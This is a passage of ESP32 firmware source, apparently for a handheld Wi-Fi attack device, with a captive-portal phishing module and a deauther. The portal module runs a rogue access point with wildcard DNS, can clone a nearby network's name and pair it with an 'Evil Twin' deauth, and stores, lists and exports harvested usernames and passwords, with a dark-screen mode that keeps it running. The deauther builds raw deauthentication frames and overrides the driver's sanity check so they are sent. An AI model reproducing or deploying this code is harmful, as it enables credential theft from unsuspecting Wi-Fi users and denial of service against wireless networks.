  OnScreenKeyboardConfig cfg;
  cfg.titleLine1      = "[!] Set the SSID that your AP will use";
  cfg.titleLine2      = "to host the captive portal. ^ caps, # sym";
  osKeyboardUseStandardLayout(cfg);
  cfg.maxLen          = 31;
  cfg.shuffleNames    = seriesSSIDs;
  cfg.shuffleCount    = numSeriesSSIDs;
  cfg.buttonsY        = 195;
  cfg.backLabel       = "Back";
  cfg.middleLabel     = "Shuffle";
  cfg.okLabel         = "OK";
  cfg.enableShuffle   = true;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg   = "SSID cannot be empty!";

  inputSSID = cpEepromReadString(CUSTOM_SSID_ADDR, 32);   // comeca com o ultimo nome
  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, inputSSID);
  if (r.accepted && r.text.length() > 0) {
    inputSSID = r.text;
    cpEepromWriteString(CUSTOM_SSID_ADDR, inputSSID, 32);
    s_ssidSrc = 1;
    EEPROM.write(SSID_SRC_ADDR, s_ssidSrc);
    EEPROM.commit();
    cpApplySsidSource(true);
    Serial.printf("[portal] nome: Custom -> %s\n", custom_ssid);
  }
  drawConfigMenu();
}

void drawMainMenu() {
  currentScreen = MAIN_MENU;
  cportalUpdateNavLabels();

  tft.setTextSize(1);
  wifiClearBody(TFT_BLACK);

  displayPrint("Current SSID:", UI_TEXT, false);
  displayPrint(custom_ssid, WHITE, false);
  displayPrint("...", UI_TEXT, false);

  displayPrint("Page: " + cpPageSourceLabel(), UI_TEXT, false);
  displayPrint("Channel: " + String(ap_channel), UI_TEXT, false);
  displayPrint(attackActive ? "Status: Active" : "Status: Inactive", UI_TEXT, false);
  if (cp_deauth_active) {
    char buf[32];
    snprintf(buf, sizeof(buf), "Evil Twin: %u pkts", (unsigned)cp_deauth_packet_count);
    displayPrint(buf, UI_WARN, false);
  }
}

void drawCredList() {
  cportalUpdateNavLabels();
  wifiClearBody(TFT_BLACK);
  tft.setTextColor(UI_TEXT, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(0, 50);
  tft.println("Credentials List:");

  tft.setCursor(0, 70);
  tft.print("User");
  tft.setCursor(80, 70);
  tft.print("Pass");
  tft.setCursor(160, 70);
  tft.print("SSID");
  tft.drawFastHLine(0, 80, 245, UI_LINE);

  int count = EEPROM.read(COUNT_ADDR);
  Serial.printf("Reading %d credentials from EEPROM\n", count);

  int startIdx = credPage * kCredRowsPerPage;
  int yOffset = 90;

  if (count == 0) {
    tft.setCursor(0, yOffset);
    tft.println("No credentials");
    Serial.println("No credentials found");
  } else {
    for (int i = startIdx; i < min(count, startIdx + kCredRowsPerPage); i++) {
      Credential cred;
      EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
      Serial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s, Provider=%s\n",
                    i, CRED_ADDR + (i * CRED_SIZE), cred.username, cred.password, cred.ssid,
                    cred.provider);

      tft.setTextColor(WHITE, TFT_BLACK);
      tft.setCursor(0, yOffset);
      tft.print(cred.username);
      tft.setCursor(80, yOffset);
      tft.print(cred.password);
      tft.setCursor(160, yOffset);
      tft.print(cred.ssid);

      tft.setTextColor(UI_WARN, TFT_BLACK);
      tft.setCursor(225, yOffset - 1);
      tft.print("X");

      // segunda linha: por qual botao o login foi feito
      tft.setTextColor(UI_ACCENT, TFT_BLACK);
      tft.setCursor(0, yOffset + 9);
      tft.print(cred.provider);

      yOffset += kCredRowH;
    }
  }

  if (!featureHasTouchNavBar()) {
    const int buttonY = 290;
    tft.setTextColor(FEATURE_TEXT, TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextDatum(MC_DATUM);

    tft.fillRoundRect(5, buttonY, 50, 20, 8, DARK_GRAY);
    tft.drawRoundRect(5, buttonY, 50, 20, 8, FEATURE_TEXT);
    tft.drawString("Back", 30, buttonY + 10);

    tft.fillRoundRect(65, buttonY, 50, 20, 8, DARK_GRAY);
    tft.drawRoundRect(65, buttonY, 50, 20, 8, FEATURE_TEXT);
    tft.drawString("Clear", 90, buttonY + 10);

    tft.fillRoundRect(125, buttonY, 50, 20, 8, DARK_GRAY);
    tft.drawRoundRect(125, buttonY, 50, 20, 8, FEATURE_TEXT);
    tft.drawString("Export", 150, buttonY + 10);

    if (credPage > 0) {
      tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
      tft.drawRoundRect(185, buttonY, 50, 20, 8, FEATURE_TEXT);
      tft.drawString("Prev", 210, buttonY + 10);
    } else if (count > (credPage + 1) * kCredRowsPerPage) {
      tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
      tft.drawRoundRect(185, buttonY, 50, 20, 8, FEATURE_TEXT);
      tft.drawString("Next", 210, buttonY + 10);
    }
  }
}

void stopAttack() {
  if (attackActive) {
    WiFi.softAPdisconnect(true);
    Serial.println("Access Point stopped");
    displayPrint("Access Point stopped", GREEN, false);

    dnsServer.stop();
    Serial.println("DNS server stopped");
    displayPrint("DNS server stopped", GREEN, false);

    server.close();
    Serial.println("Web server stopped");
    displayPrint("Web server stopped", GREEN, false);

    cpStopDeauth();

    attackActive = false;
    drawMainMenu();
  } else {
    Serial.println("Attack already inactive");
    displayPrint("Attack already inactive", GREEN, false);
  }
}

void startAttack() {
  if (!attackActive) {
    cpLogHeap("antes do softAP");
    WiFi.mode(WIFI_AP);
    WiFi.softAP(custom_ssid, password, ap_channel);
    cpLogHeap("depois do softAP");
    Serial.println("Access Point started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());
    int ip = WiFi.softAPIP();
    displayPrint("Access Point started", GREEN, false);

    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    cpLogHeap("depois do DNS");
    Serial.println("DNS server started");
    displayPrint("DNS server started", GREEN, false);

    setupWebServer();
    server.begin();
    cpLogHeap("depois do web server");
    Serial.println("Web server started");
    displayPrint("Web server started", GREEN, false);

    attackActive = true;
    drawMainMenu();
  } else {
    Serial.println("Attack already active");
    displayPrint("Attack already active", GREEN, false);
  }
}

void handleMainMenu(int x, int y) {
  (void)x;
  (void)y;
}

void handleCredList(int x, int y) {
  int count = EEPROM.read(COUNT_ADDR);
  int startIdx = credPage * kCredRowsPerPage;
  int yOffset = 90;

  for (int i = startIdx; i < min(count, startIdx + kCredRowsPerPage); i++) {
    if (x >= 218 && x <= 238 && y >= yOffset - 3 && y <= yOffset + 15) {
      Serial.println("Delete button pressed for credential " + String(i));
      deleteCredential(i);
      drawCredList();
      return;
    }
    yOffset += kCredRowH;
  }

  if (featureHasTouchNavBar()) {
    return;
  }

  const int buttonY = 290;

  if (x >= 5 && x <= 55 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Back button pressed");
    currentScreen = MAIN_MENU;
    drawMainMenu();
  }
  if (x >= 65 && x <= 115 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Clear All button pressed");
    clearAllCredentials();
    credPage = 0;
    drawCredList();
  }
  if (x >= 125 && x <= 175 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Export button pressed");
    int dumped = 0;
    if (cpDumpAllCredentialsToSD(&dumped)) {
      cpCredListStatus("Exported " + String(dumped) + " -> SD:/captive_portal/eeprom_dump.csv", UI_OK);
    } else {
      cpCredListStatus("Export failed: SD not ready", UI_WARN);
    }
  }
  if (credPage > 0 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Prev button pressed");
    credPage--;
    drawCredList();
  } else if (count > (credPage + 1) * kCredRowsPerPage && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Next button pressed");
    credPage++;
    drawCredList();
  }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 6

  static int iconX[ICON_NUM] = {90, 130, 170, 210, 50, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_dialog,
    bitmap_icon_list,
    bitmap_icon_antenna,
    bitmap_icon_power,
    bitmap_icon_wifi2,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, UI_ICON);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, UI_ICON);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          currentScreen = CONFIG_MENU;
          drawConfigMenu();
          animationState = 0;
          activeIcon = -1;
          break;
        case 1:
          currentScreen = CRED_LIST;
          credPage = 0;
          drawCredList();
          animationState = 0;
          activeIcon = -1;
          break;
        case 2:
          startAttack();
          animationState = 0;
          activeIcon = -1;
          break;
        case 3:
          stopAttack();
          animationState = 0;
          activeIcon = -1;
          break;

         case 4:
           cpCloneExistingAPFlow();
           animationState = 0;
           activeIcon = -1;
          break;

         case 5:
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;

    case 4: break;
    case 5: break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
     if (currentScreen == CRED_LIST) {
      handleCredList(x, y);
    } else {
      handleMainMenu(x, y);
    }

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 5) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void cportalUpdateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (s_cloneUiActive) {
    setTouchNavLabels("Back",
                      s_clonePickMode ? (s_cloneNextEn ? "Next" : nullptr) : "Scan",
                      "Exit",
                      s_clonePrevEn ? "Prev" : nullptr,
                      s_clonePickMode ? "Pick" : nullptr);
  } else if (currentScreen == CRED_LIST) {
    setTouchNavLabels("Back", nullptr, "Clear", nullptr, "Export");
  } else if (currentScreen == CONFIG_MENU) {
    setTouchNavLabels("Back", "Down", "OK", "Up", nullptr);
  } else {
    // ESQUERDA=Volta | BAIXO=Credenciais | SELECT=Start/Stop | DIREITA=Config
    setTouchNavLabels("Back", "Creds",
                      attackActive ? "Stop" : "Start", "Sleep", "Config");
  }
  redrawTouchButtonBar();
}

// --- economia de bateria: desligar a tela -----------------------------------
// CIMA apaga a tela DE VERDADE: backlight em 0 (nao e "brilho minimo") e o
// painel recebe DISPOFF. Nesse estado SOMENTE o CIMA responde - os outros
// botoes sao lidos e descartados. O captive portal continua atendendo os
// clientes normalmente (DNS + HTTP seguem rodando).
// O LED de status (NeoPixel no GPIO 1) pisca a cada 5 s para mostrar que o
// aparelho esta vivo.
static bool     s_sleeping       = false;
static bool     s_sleepLedOn     = false;
static uint32_t s_sleepLastBlink = 0;

static const uint32_t CP_SLEEP_BLINK_MS  = 5000;   // pisca a cada 5 s
static const uint32_t CP_SLEEP_LED_ON_MS = 130;    // duracao do pisca
static const uint8_t  CP_SLEEP_LED_R     = 0;
static const uint8_t  CP_SLEEP_LED_G     = 0;
static const uint8_t  CP_SLEEP_LED_B     = 48;

static void cpSleepLed(bool on) {
#if NEOPIXEL_PIN >= 0
  if (on) neopixelWrite(NEOPIXEL_PIN, CP_SLEEP_LED_R, CP_SLEEP_LED_G, CP_SLEEP_LED_B);
  else    neopixelWrite(NEOPIXEL_PIN, 0, 0, 0);
#else
  (void)on;
#endif
}

static void cpSleepEnter() {
  if (s_sleeping) return;
  s_sleeping       = true;
  s_sleepLedOn     = true;             // primeiro pisca imediato
  s_sleepLastBlink = millis();

  // Desliga de verdade: backlight sem PWM (pino em LOW) + painel em sleep.
  screenPowerOff();
  cpSleepLed(true);

  Serial.printf("[portal] tela DESLIGADA (configurado=%u). CIMA acorda.\n",
                (unsigned)settings().brightness);
}

static void cpSleepWake() {
  if (!s_sleeping) return;
  s_sleeping   = false;
  s_sleepLedOn = false;
  cpSleepLed(false);

  // Devolve o brilho que o usuario configurou (o helper garante que nunca
  // volta com brilho 0).
  uint8_t b = settings().brightness;
  if (b < BKL_LEVEL_MIN) b = BKL_LEVEL_MED;
  screenPowerOn(b);
  Serial.printf("[portal] tela LIGADA (backlight=%u).\n", (unsigned)b);

  // Redesenha a tela em que o usuario estava.
  switch (currentScreen) {
    case CRED_LIST:   drawCredList();   break;
    case CONFIG_MENU: drawConfigMenu(); break;
    default:          drawMainMenu();   break;
  }
  redrawTouchButtonBar();
}

// Chamado a cada volta do loop enquanto a tela esta apagada.
static void cpSleepTick() {
  const uint32_t now = millis();
  if (s_sleepLedOn) {
    if (now - s_sleepLastBlink >= CP_SLEEP_LED_ON_MS) {
      cpSleepLed(false);
      s_sleepLedOn = false;
    }
  } else if (now - s_sleepLastBlink >= CP_SLEEP_BLINK_MS) {
    cpSleepLed(true);
    s_sleepLedOn     = true;
    s_sleepLastBlink = now;
  }
}

static void cportalTeardown() {
  // Se sair do portal com a tela apagada, devolve a tela ao usuario.
  if (s_sleeping) {
    s_sleeping = false;
    cpSleepLed(false);
    uint8_t b = settings().brightness;
    if (b < BKL_LEVEL_MIN) b = BKL_LEVEL_MED;
    screenPowerOn(b);
  }
  stopAttack();
  cpStopDeauth();
  esp_wifi_set_promiscuous(false);
}

static void cportalHandleMainNavButtons() {
  if (currentScreen != MAIN_MENU || s_cloneUiActive) {
    return;
  }
  const uint32_t now = millis();
  if (now - cportalLastBtnMs < cportalDebounceMs) {
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    // ESQUERDA = volta (sai do Captive Portal)
    cportalTeardown();
    feature_exit_requested = true;
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    // DIREITA = Configuracao
    currentScreen = CONFIG_MENU;
    drawConfigMenu();
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_RIGHT);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    // BAIXO = Credenciais
    currentScreen = CRED_LIST;
    credPage = 0;
    drawCredList();
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_DOWN);
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    // CIMA = apagar a tela (economia de bateria)
    cpSleepEnter();
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_UP);
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT)) {
    if (attackActive) {
      stopAttack();
    } else {
      startAttack();
    }
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_SELECT);
  }
}

static void cportalHandleCredNavButtons() {
  if (currentScreen != CRED_LIST) {
    return;
  }
  const uint32_t now = millis();
  if (now - cportalLastBtnMs < cportalDebounceMs) {
    return;
  }
  if (isButtonPressedEdge(BTN_LEFT)) {
    currentScreen = MAIN_MENU;
    drawMainMenu();
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_LEFT);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    int dumped = 0;
    if (cpDumpAllCredentialsToSD(&dumped)) {
      cpCredListStatus("Exported " + String(dumped) + " -> SD:/captive_portal/eeprom_dump.csv", UI_OK);
    } else {
      cpCredListStatus("Export failed: SD not ready", UI_WARN);
    }
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_RIGHT);
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT)) {
    clearAllCredentials();
    credPage = 0;
    drawCredList();
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_SELECT);
  }
}

static void drawConfigMenu() {
  currentScreen = CONFIG_MENU;
  cportalUpdateNavLabels();
  wifiClearBody(TFT_BLACK);
  tft.setTextSize(1);

  tft.setTextColor(UI_TEXT, TFT_BLACK);
  tft.setCursor(8, 40);
  tft.println("Config");

  // Ordem pedida: Page | SSID Std | SSID Custom | SSID Clone
  const char* labels[4] = { "Page", "SSID Std", "SSID Custom", "SSID Clone" };
  for (int i = 0; i < 4; i++) {
    int y = 62 + i * 21;
    bool sel = (i == s_configSel);
    tft.setCursor(8, y);
    tft.setTextColor(sel ? ORANGE : WHITE, TFT_BLACK);
    tft.print(sel ? "> " : "  ");
    // "*" marca qual das tres origens esta em uso
    tft.print((i >= 1 && s_ssidSrc == (uint8_t)(i - 1)) ? "*" : " ");
    tft.print(labels[i]);

    String val;
    if (i == 0) {
      val = cpPageSourceLabel();
    } else if (i == 1) {
      char b[48];
      cpStdSsidForPage(b, sizeof(b));
      val = b;
    } else if (i == 2) {
      val = cpEepromReadString(CUSTOM_SSID_ADDR, 32);
    } else {
      val = cpEepromReadString(CLONE_SSID_ADDR, 32);
    }
    if (val.length() == 0) val = "-";
    if (val.length() > 17) val = val.substring(0, 16) + "~";

    tft.setTextColor(sel ? ORANGE : UI_WARN, TFT_BLACK);
    tft.setCursor(112, y);
    tft.print(val);
  }

  tft.setTextColor(UI_TEXT, TFT_BLACK);
  tft.setCursor(8, 152);
  tft.print("* = nome em uso");
}

static void cportalHandleConfigNavButtons() {
  if (currentScreen != CONFIG_MENU) {
    return;
  }
  const uint32_t now = millis();
  if (now - cportalLastBtnMs < cportalDebounceMs) {
    return;
  }
  if (isButtonPressedEdge(BTN_LEFT)) {
    currentScreen = MAIN_MENU;
    drawMainMenu();
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_LEFT);
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    if (s_configSel > 0) s_configSel--;
    drawConfigMenu();
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_UP);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    if (s_configSel < 3) s_configSel++;
    drawConfigMenu();
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_DOWN);
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT)) {
    if (s_configSel == 0) {
      // Page: cicla Local -> SD <nome> -> ... -> Local
      s_pageSourceIdx++;
      if (s_pageSourceIdx >= s_pageSourceCount) s_pageSourceIdx = 0;
      EEPROM.write(CP_SOURCE_ADDR, s_pageSourceIdx);
      EEPROM.commit();
      Serial.printf("[portal] pagina: %s\n", cpPageSourceLabel().c_str());
      // o nome padrao acompanha a pagina escolhida
      if (s_ssidSrc == 0) cpApplySsidSource(true);
      drawConfigMenu();
    } else if (s_configSel == 1) {
      // usar o nome padrao da pagina
      s_ssidSrc = 0;
      EEPROM.write(SSID_SRC_ADDR, s_ssidSrc);
      EEPROM.commit();
      cpApplySsidSource(true);
      Serial.printf("[portal] nome: Std -> %s\n", custom_ssid);
      drawConfigMenu();
    } else if (s_configSel == 2) {
      cpEditSsid();            // escreve o nome; ja aplica e redesenha
    } else {
      cpCloneExistingAPFlow(); // clona de uma rede proxima; ja aplica e redesenha
    }
    cportalLastBtnMs = now;
    cportalWaitButtonRelease(BTN_SELECT);
  }
}

void cportalSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  cportalUpdateNavLabels();
  featureClearContent(TFT_BLACK);

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();
  runUI();

  EEPROM.begin(EEPROM_SIZE);
  int count = EEPROM.read(COUNT_ADDR);
  if (count > MAX_CREDS || count < 0) {
    Serial.println("Invalid credential count, resetting to 0");
    EEPROM.write(COUNT_ADDR, 0);
    EEPROM.commit();
  }
  loadSSID();

  // Fonte da pagina: Local (embutida) ou uma das local_N.html do cartao.
  cpSeedPortalFilesOnSD();   // pasta + README + varredura das paginas
  cpSeedSsidMap();           // cria o ssid.txt se faltar
  cpLoadSsidMap();           // le a relacao pagina -> nome da rede

  s_pageSourceIdx = EEPROM.read(CP_SOURCE_ADDR);
  if (s_pageSourceIdx >= s_pageSourceCount) s_pageSourceIdx = 0;

  s_ssidSrc = EEPROM.read(SSID_SRC_ADDR);
  if (s_ssidSrc > 2) s_ssidSrc = 0;
  cpApplySsidSource(false);
  Serial.printf("[portal] pagina: %s | nome (%s): %s\n",
                cpPageSourceLabel().c_str(),
                s_ssidSrc == 0 ? "Std" : (s_ssidSrc == 1 ? "Custom" : "Clone"),
                custom_ssid);
  cpLogHeap("cportalSetup fim");

  // Feature enters STOPPED; the user presses SELECT to start the portal.

  drawMainMenu();
  setupTouchscreen();
  cportalUpdateNavLabels();
  redrawTouchButtonBar();
}

void cportalLoop() {

  if (feature_active && feature_exit_requested) {
    cportalTeardown();
    feature_exit_requested = true;
    return;
  }

  if (s_sleeping) {
    // Tela apagada: nao desenha NADA, mas o portal continua atendendo.
    if (attackActive) {
      dnsServer.processNextRequest();
      server.handleClient();

      unsigned long now = millis();
      if (cp_deauth_active && now - cp_last_deauth_time >= 50) {
        cpSendDeauthFrame();
        cp_last_deauth_time = now;
      }
    }
    cpSleepTick();

    // Somente o CIMA responde. Os outros sao lidos e descartados para nao
    // acumular borda (mesmo padrao usado no resto do firmware).
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_DOWN);
    (void)isButtonPressedEdge(BTN_SELECT);
    if (isButtonPressedEdge(BTN_UP)) {
      cpSleepWake();
      cportalLastBtnMs = millis();
    }
    return;
  }

  maintainTouchNavBar();
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);

  cportalHandleMainNavButtons();
  cportalHandleCredNavButtons();
  cportalHandleConfigNavButtons();
  updateStatusBar();
  runUI();

  if (attackActive) {
    dnsServer.processNextRequest();
    server.handleClient();

    unsigned long now = millis();
    if (cp_deauth_active && now - cp_last_deauth_time >= 50) {
      cpSendDeauthFrame();
      cp_last_deauth_time = now;
    }
  }

}

}  // namespace CaptivePortal

namespace Deauther {

#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320

static unsigned long deautherLastButtonPress = 0;
static const unsigned long deautherDebounceTime = 200;

// Larger row height = easier touch selection.
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;

static int deautherNetworksPerPage() {
  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
}

static void deautherUpdateNavLabels(bool onAttackScreen);
void drawScanScreen();
void drawAttackScreen();

uint8_t deauth_frame_default[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00,
    0x01, 0x00
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int selected_ap_index = -1;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
int current_page = 0;
int currentIndex = 0;

static void deautherUpdateNavLabels(bool onAttackScreen) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  // Layout remapeado:
  //  lista de scan: LEFT=Exit, DOWN=Next, SELECT=View, UP=Prev, RIGHT=Rescan.
  //  tela de ataque (View): LEFT=Back (pra lista), SELECT=Start/Stop, resto livre.
  if (onAttackScreen) {
    setTouchNavLabels("Back", nullptr, attack_running ? "Stop" : "Start", nullptr, nullptr);
  } else {
    setTouchNavLabels("Exit", "Next", "View", "Prev", "Rescan");
  }
  redrawTouchButtonBar();
}

static void deautherDrawApRow(int i, int y, bool isSel) {
  char buf[64];
  char ssid[16];
  strncpy(ssid, (char*)ap_list[i].ssid, 11);
  ssid[11] = '\0';
  if (strlen((char*)ap_list[i].ssid) > 11) {
    strcat(ssid, "...");
  }
  const char* enc = ap_list[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s",
           i + 1, ssid, ap_list[i].rssi, ap_list[i].primary, enc);

  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
  tft.setCursor(2, y);
  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
  tft.print(isSel ? ">" : " ");
  tft.setCursor(10, y);
  tft.setTextColor(isSel ? ORANGE : (ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
  tft.println(buf);
}

static void deautherOpenTarget(int index) {
  if (index < 0 || index >= network_count) {
    return;
  }
  currentIndex = index;
  selected_ap_index = index;
  selectedAp = ap_list[index];
  selectedChannel = ap_list[index].primary;
  drawAttackScreen();
}

// Diagnostic: counts how many times the sanity-check override is actually
// invoked by the WiFi driver's raw-TX path. If this stays 0 while the deauth
// runs, the core's internal copy is still rejecting our frames (override not
// taking effect). If it increments, the override is live and any remaining
// drop is elsewhere (channel / PMF / frame content).
volatile uint32_t g_sanity_check_calls = 0;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    g_sanity_check_calls++;
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    packet_count++;
    if (res == ESP_OK) {
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;

    }

#if DEAUTH_DEBUG_LOG
    static uint32_t s_lastLog = 0;
    const uint32_t now = millis();
    if (now - s_lastLog >= 1000) {
        wifi_mode_t mode;
        esp_err_t gm = esp_wifi_get_mode(&mode);
        Serial.printf("[deauth] tx res=%d mode=%d (gm=%d) sanity=%u pkt=%u ok=%u fail=%u\n",
                      res, (int)mode, gm, g_sanity_check_calls, packet_count, success_count, consecutive_failures);
        s_lastLog = now;
    }
#endif
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    deauth_frame[24] = 7;   // reason code = 7 (Class 3 frame from nonassociated STA)

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
}

int compare_ap(const void *a, const void *b) {
    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
    return ap2->rssi - ap1->rssi;
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {

    FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                             : FeatureUI::ButtonStyle::Secondary;
    FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
    if (featureHasTouchNavBar()) {
        deautherUpdateNavLabels(selected_ap_index >= 0);
        return;
    }

    tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

    if (leftButton && leftButton[0]) {
        drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
    }

    if (prevButton && prevButton[0]) {
        drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
    }
    if (nextButton && nextButton[0]) {
        drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
    }
}

void drawScanScreen() {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    wifiClearBody(TFT_BLACK);
    tft.setTextSize(1);

    if (scanning) {
        tft.setCursor(10, 50);
        tft.setTextColor(GREEN);
        tft.println("Scanning.");
        loading(100, ORANGE, 0, 0, 3, true);
        tft.setCursor(10, 65);
        tft.println("Wait a moment.");
        return;
    }

    if (network_count == 0) {
        tft.setTextColor(GREEN);
        tft.setCursor(10, 50);
        tft.println("No networks found.");
        tft.setCursor(10, 65);
        tft.println("Press Rescan.");
    } else {
        const int perPage = deautherNetworksPerPage();
        if (currentIndex < 0) {
          currentIndex = 0;
        }
        if (currentIndex >= network_count) {
          currentIndex = max(0, network_count - 1);
        }
        current_page = currentIndex / max(1, perPage);

        tft.setTextColor(GREEN);
        tft.setCursor(10, LIST_HEADER_Y);
        tft.println("Networks:");

        char page_buf[20];
        snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
                 current_page + 1, max(1, (network_count + perPage - 1) / perPage));
